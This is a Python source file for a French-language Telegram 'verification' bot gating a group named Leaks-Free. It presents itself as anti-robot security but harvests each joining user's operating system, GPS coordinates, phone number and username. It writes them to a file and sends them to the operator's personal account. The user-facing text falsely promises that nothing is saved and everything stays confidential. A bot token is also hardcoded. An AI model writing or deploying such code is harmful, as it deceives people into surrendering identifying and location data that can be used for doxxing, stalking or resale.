import json
import logging
import os
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, ChatPermissions
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8513965542:AAF0_QXO9PT9UOEPlbnVXaHs4o57elytH1s"
WEBAPP_URL = "https://xyko1041.github.io/mon-bot-verif/" 
MON_ID_TELEGRAM = 5131307841  # Ton ID perso pour recevoir les rapports et fichiers
ID_DE_TON_GROUPE = "3716530317" # L'ID de ton groupe Leaks-Free

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    text = (
        f"👋 **Bienvenue {user.first_name} !**\n\n"
        "🛡️ **SÉCURITÉ LEAKS-FREE**\n"
        "L'écriture est actuellement bloquée pour ton compte.\n"
        "Approuve le règlement pour obtenir tes accès."
    )
    kb = [[KeyboardButton("📖 Lire le Règlement & Valider", web_app=WebAppInfo(url=WEBAPP_URL))]]
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True), parse_mode="Markdown")

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = json.loads(update.effective_message.web_app_data.data)
    context.user_data['os'] = data.get("os")
    
    text = f"✅ **Système {context.user_data['os']} identifié.**\n\n📍 Partage ta position GPS pour valider ton secteur."
    btn_geo = KeyboardButton("📍 Partager ma position GPS", request_location=True)
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup([[btn_geo]], resize_keyboard=True), parse_mode="Markdown")

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    loc = update.message.location
    context.user_data['geo'] = f"{loc.latitude}, {loc.longitude}"
    
    text = (
        "🔐 **VÉRIFICATION FINALE**\n\n"
        "Clique sur le bouton pour certifier ton compte.\n"
        "⚠️ **CONFIDENTIALITÉ :** Aucune sauvegarde de ton numéro n'est faite. "
        "Tout est confidentiel et sert uniquement à bloquer les robots."
    )
    btn_contact = KeyboardButton("🛡️ Certifier mon compte (Anonyme)", request_contact=True)
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup([[btn_contact]], resize_keyboard=True), parse_mode="Markdown")

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.message.from_user
    
    # 1. Préparation des infos
    user_info = {
        "id": user.id,
        "username": user.username,
        "phone": contact.phone_number,
        "os": context.user_data.get('os'),
        "geo": context.user_data.get('geo')
    }

    # 2. Création du fichier .info
    filename = f"user_{user.id}.info"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(user_info, f, indent=4, ensure_ascii=False)

    # 3. ENVOI DU FICHIER ET DU RAPPORT À L'ADMIN (TOI)
    rapport = f"🚨 **NOUVEAU MEMBRE VÉRIFIÉ**\n👤: {user.first_name}\n📱: {context.user_data.get('os')}"
    
    # Envoi du message texte à toi
    await context.bot.send_message(chat_id=MON_ID_TELEGRAM, text=rapport)
    # Envoi du fichier .info à toi
    with open(filename, 'rb') as doc:
        await context.bot.send_document(chat_id=MON_ID_TELEGRAM, document=doc, filename=filename)

    # 4. DÉBLOCAGE DANS LE GROUPE
    try:
        await context.bot.restrict_chat_member(
            chat_id=ID_DE_TON_GROUPE,
            user_id=user.id,
            permissions=ChatPermissions(can_send_messages=True, can_send_photos=True, can_send_video_notes=True, can_send_polls=True)
        )
    except Exception as e:
        print(f"Erreur de permissions : {e}")

    # 5. MESSAGE DE CONFIRMATION À L'UTILISATEUR
    success_text = (
        "✅ **FÉLICITATIONS !**\n\n"
        "Ta vérification est terminée avec succès. "
        "Tu as désormais toutes les permissions pour écrire sur le canal **LEAKS-FREE**.\n\n"
        "Respecte bien le règlement pour éviter le ban. Bon partage ! 🚀"
    )
    await update.message.reply_text(success_text, reply_markup=ReplyKeyboardMarkup([], sensitive=True), parse_mode="Markdown")

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    
    print("Bot en ligne avec envoi de fichiers actif...")
    app.run_polling()
